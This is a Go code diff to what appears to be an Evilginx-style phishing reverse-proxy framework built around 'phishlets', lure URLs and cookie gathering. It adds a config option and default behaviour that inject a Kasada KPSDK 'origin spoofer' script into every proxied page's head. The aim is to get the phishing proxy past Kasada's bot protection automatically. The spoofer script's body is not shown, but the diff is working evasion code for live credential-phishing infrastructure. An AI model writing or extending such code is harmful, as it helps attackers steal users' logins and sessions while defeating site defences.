@@ -138,6 +138,7 @@ type Phishlet struct {
 	pathRewrite       []PathRewrite
 	customParams      map[string]string
 	isTemplate        bool
+	kasadaOrigins     []KasadaOrigin
 }
 
 type ConfigParam struct {
@@ -225,6 +226,22 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+// ConfigKasadaOrigin declares a Kasada KPSDK origin-spoofer for one proxied hostname.
+// The parser synthesises a sub_filter from KASADA_ORIGIN_SPOOFER_JS so phishlet authors
+// do not need to copy-paste the 500-character inline script.
+type ConfigKasadaOrigin struct {
+	Hostname *string `mapstructure:"triggers_on"`
+	Sub      *string `mapstructure:"orig_sub"`
+	Domain   *string `mapstructure:"domain"`
+}
+
+// KasadaOrigin is the parsed form of a ConfigKasadaOrigin entry.
+type KasadaOrigin struct {
+	Hostname string
+	Sub      string
+	Domain   string
+}
+
 type ConfigPathRewrite struct {
 	Trigger *string `mapstructure:"trigger"`
 	Target  *string `mapstructure:"target"`
@@ -245,7 +262,8 @@ type ConfigPhishlet struct {
 	LoginItem         *ConfigLogin         `mapstructure:"login"`
 	JsInject          *[]ConfigJsInject    `mapstructure:"js_inject"`
 	Intercept         *[]ConfigIntercept   `mapstructure:"intercept"`
-	PathRewrite       *[]ConfigPathRewrite `mapstructure:"path_rewrite"`
+	PathRewrite       *[]ConfigPathRewrite  `mapstructure:"path_rewrite"`
+	KasadaOrigins     *[]ConfigKasadaOrigin `mapstructure:"kasada_origins"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -280,6 +298,7 @@ func (p *Phishlet) Clear() {
 	p.forcePost = []ForcePost{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
+	p.kasadaOrigins = []KasadaOrigin{}
 }
 
 func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
@@ -475,6 +494,68 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
 		}
 	}
+	if fp.KasadaOrigins != nil {
+		for _, ko := range *fp.KasadaOrigins {
+			if ko.Hostname == nil {
+				return fmt.Errorf("kasada_origins: missing `triggers_on` field")
+			}
+			if ko.Domain == nil {
+				return fmt.Errorf("kasada_origins: missing `domain` field")
+			}
+			hostname := p.paramVal(*ko.Hostname)
+			sub := ""
+			if ko.Sub != nil {
+				sub = p.paramVal(*ko.Sub)
+			}
+			domain := p.paramVal(*ko.Domain)
+			host := domain
+			if sub != "" {
+				host = sub + "." + domain
+			}
+			origin := "https://" + host
+			script := strings.NewReplacer(
+				"{kasada_host}", host,
+				"{kasada_domain}", domain,
+				"{kasada_origin}", origin,
+			).Replace(KASADA_ORIGIN_SPOOFER_JS)
+			p.addSubFilter(hostname, sub, domain, []string{"text/html"}, `(?i)(<head[^>]*>)`, "$1<script>"+script+"</script>", false, []string{})
+			p.kasadaOrigins = append(p.kasadaOrigins, KasadaOrigin{Hostname: hostname, Sub: sub, Domain: domain})
+		}
+	}
+
+	// Auto-generate a Kasada KPSDK origin spoofer for every proxy host that is not
+	// already covered by a manually authored sub_filter or an explicit kasada_origins
+	// entry.  This keeps Kasada passthrough active by default with no per-phishlet
+	// configuration required.
+	{
+		covered := make(map[string]bool)
+		for host, sfs := range p.subfilters {
+			for _, sf := range sfs {
+				if strings.Contains(sf.replace, "Object.defineProperty") {
+					covered[host] = true
+					break
+				}
+			}
+		}
+		for _, ph := range p.proxyHosts {
+			host := ph.domain
+			if ph.orig_subdomain != "" {
+				host = ph.orig_subdomain + "." + ph.domain
+			}
+			if covered[host] {
+				continue
+			}
+			origin := "https://" + host
+			script := strings.NewReplacer(
+				"{kasada_host}", host,
+				"{kasada_domain}", ph.domain,
+				"{kasada_origin}", origin,
+			).Replace(KASADA_ORIGIN_SPOOFER_JS)
+			p.addSubFilter(host, ph.orig_subdomain, ph.domain, []string{"text/html"}, `(?i)(<head[^>]*>)`, "$1<script>"+script+"</script>", false, []string{})
+			covered[host] = true
+		}
+	}
+
 	if fp.JsInject != nil {
 		for _, js := range *fp.JsInject {
 			if js.TriggerDomains == nil {
@@ -825,6 +906,10 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 
 func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
+}
+
+func (p *Phishlet) GetKasadaOrigins() []KasadaOrigin {
+	return p.kasadaOrigins
 }
 
 func (p *Phishlet) GetCookieGatherDelay() int {
